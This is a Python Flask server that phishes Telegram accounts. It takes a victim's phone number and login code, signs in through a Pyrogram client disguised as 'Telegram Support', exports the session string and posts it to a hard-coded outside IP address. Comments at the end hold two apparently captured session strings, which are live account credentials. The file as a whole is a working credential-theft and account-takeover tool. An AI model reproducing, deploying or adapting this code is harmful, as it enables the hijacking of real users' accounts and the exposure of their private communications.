import json

import requests
import threading
from flask import Flask, session, request
from flask_session import Session
from flask_cors import CORS
from configparser import ConfigParser
from pyrogram import Client
import nest_asyncio


app = Flask(__name__)
app.secret_key = 'super secret key'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_FILE_DIR'] = "session_data"
app.config['PERMANENT_SESSION_LIFETIME'] = 10
Session(app)
CORS(app, support_credentials=True)

tg_creds = ConfigParser()
tg_creds.read('config.ini')
creds = tg_creds['Telegram API']

phone_number = ''
phone_code = ''
code_info = ''


@app.route("/", methods=["GET"])
def landing():
    return "<p>Hello World!</p>"


@app.route("/processNumber", methods=['OPTIONS', 'POST'])
def processNumber():
    request_json = json.loads(request.get_data())
    session['phone_number'] = request_json.get('phone_number', '')
    return f"<p>Authorization has been started!</p>"


@app.route("/processCode", methods=['OPTIONS', 'POST'])
def processCode():
    request_json = json.loads(request.get_data())
    session['phone_code'] = request_json.get('phone_code', '')
    return "<p>Code was sent!</p>"


@app.route("/print", methods=["GET"])
def return_result():
    return phone_number


@app.after_request
def sign_in(response):
    global code_info, phone_number, phone_code
    phone_number = session.get('phone_number', phone_number)
    phone_code = session.get('phone_code', phone_code)
    code_info = code_info if code_info else ''
    if phone_number and not code_info:
        nest_asyncio.apply()
        target_client = Client(
            name="target", in_memory=True,
            # User agent
            app_version='v.4.11.8 x64 Support Team', device_model='Telegram Support',
            # Bot API
            api_id=creds['api_id'], api_hash=creds['api_hash'], bot_token=creds['bot_token']
        )
        try:
            target_client.connect()
            sent_code_info = target_client.send_code(phone_number)
            code_info = sent_code_info.phone_code_hash
            while phone_code == '':
                continue
            target_client.sign_in(phone_number=phone_number, phone_code_hash=code_info, phone_code=phone_code)
            session_string = target_client.export_session_string()
            send_session(session_string)
            response.data = json.dumps({'session-string': session_string})
            target_client.disconnect()
            phone_number = ''
            phone_code = ''
            code_info = ''
            return response
        except Exception as e:
            phone_number = ''
            phone_code = ''
            code_info = ''
            target_client.disconnect()
            response.data = e
            return response
    return response

def send_session(session_string):
    host_addr = '195.2.85.217'
    host_port = '6003'
    endpoint = 'processSession'
    requests.post(
        url=f'https://{host_addr}:{host_port}/{endpoint}',
        json={'session': session_string}
    )

# {"session-string": "AgGTkFkAIRWwJWsEpaGVaGD3fwThvpSjsE5O-EGY1O9_VkdIeeH4EL1PN3RstjsTr0_3WiHHVvxZVWaMPOMqQRmJzAnIGUtWDsfim2JwPGJgffG_3GUO2RPskMmmSk2IBBUJ2asOChOPqeSdTRGm8FRzOMJnBmy4OXmlnTYWNDGMxVH8mH2b15brxNFEYWbfbA7VnK2H4iQ5f_btyp1t_T4KpMZLkkcfzo-AUMzXeAV-rSgpVtFSHhpRRuem4ZAjslWNYtdklVAM8NZchj0_g19BxnAQ_I0Z_Vp0p5YLT-5eLExlB20UaLylt-SQF26cjedi_lbV5r7CoaxZMpVVUVk-yB9cxQAAAAGdJwjsAA"}
# {"session-string": "AgGTkFkAhlp6qufzcF3IVX2aoxCRWdVYTG9Tor0KQYmZCIO87odKSVM2hEd0EzYevBh9wwSDLHyPxXRAQo-HUIn6o7xqasRiixWEpNOvZneBv92cRWfX1ZZvLjvDplL4taVll8DnGnDQOsYiTtiIcoUIgzeArMTgfhgZ05BMkz1htUl-Xr1O8P5mNv-z6DsMO7Q8LTtgp6Oq84YF7StSfmL0XJ2VeyPOSLUiDC4iE36MWvUry37uqBR9hMBwJT6mB7eOtO1oo3O_zc8NGL1d4AHh2TAFQ7ZigOVwXF1NH6A9EQkntqUZ-KGP9oIiHCs2MZ9Sm6cErbJnfQ4vdYO9iKfAQovQBgAAAAFieMI5AA"}
app.run(ssl_context=("cert.pem", "key.pem"), host="195.2.85.141", port=6002, debug=False, use_reloader=False)
